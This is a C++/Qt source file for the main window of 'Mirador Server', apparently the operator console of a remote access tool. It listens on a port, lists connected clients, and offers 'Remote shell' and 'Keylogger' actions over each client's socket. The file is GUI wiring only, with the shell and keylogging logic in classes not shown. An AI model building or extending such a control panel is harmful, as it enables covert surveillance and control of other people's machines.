#include "mainwindow.h"
#include "ui_mainwindow.h"

#include <QTextEdit>

MainWindow::MainWindow(QWidget *parent)
    : QMainWindow(parent)
    , ui(new Ui::MainWindow)
{
    ui->setupUi(this);

    _actions = new QMenu;
    _actions->addAction(QIcon(":/img/console-ico.png"), tr("Remote shell"), this, &MainWindow::openShell);
    _actions->addAction(QIcon(":/img/keylog.png"), tr("Keylogger"), this, &MainWindow::getKeys);

    connect(ui->listenBut, &QPushButton::clicked, this, &MainWindow::listen);

    ui->listWidget->setContextMenuPolicy(Qt::CustomContextMenu);
    connect(ui->listWidget, SIGNAL(customContextMenuRequested(QPoint)), this, SLOT(contextMenu(QPoint)));
}

void MainWindow::getKeys()
{
    clearWindows();
    if(_li != nullptr){
        auto &item = ui->listWidget->selectedItems().at(0);
        QTcpSocket* con = _li->getConnection(item);
        //building window
        _out_keys = new Keylogs{con, this};
        _out_keys->show();
    }
}

void MainWindow::openShell()
{
    clearWindows();
    //get the tcpsocket
    if(_li != nullptr) {
        auto &item = ui->listWidget->selectedItems().at(0);
        QTcpSocket* con = _li->getConnection(item);
        _rem_sh = new ClientShell(con, this);
        _rem_sh->show();
    }
}

void MainWindow::clearWindows()
{
    delete _rem_sh;
    delete _out_keys;
}

MainWindow::~MainWindow()
{
    clearWindows();
    delete _li;
    _li = nullptr;
    delete ui;
    delete _actions;
    _actions = nullptr;
}

void MainWindow::contextMenu(const QPoint &pos)
{
    if(ui->listWidget->selectedItems().size() == 1)
        _actions->exec(ui->listWidget->mapToGlobal(pos));
}

void MainWindow::listen()
{
    if(_li == nullptr) {
        _li = new Listener(ui->portListen->value(), ui->listWidget);
        ui->listenBut->setText(tr("Stop"));

        ui->lineEdit->setEnabled(false);
        ui->portListen->setEnabled(false);

        setWindowTitle(windowTitle() + tr(" - Listening"));
    } else {
        ui->listenBut->setText(tr("Listen"));
        setWindowTitle("Mirador Server");

        ui->lineEdit->setEnabled(true);
        ui->portListen->setEnabled(true);

        delete _li;
        _li = nullptr;
    }
}
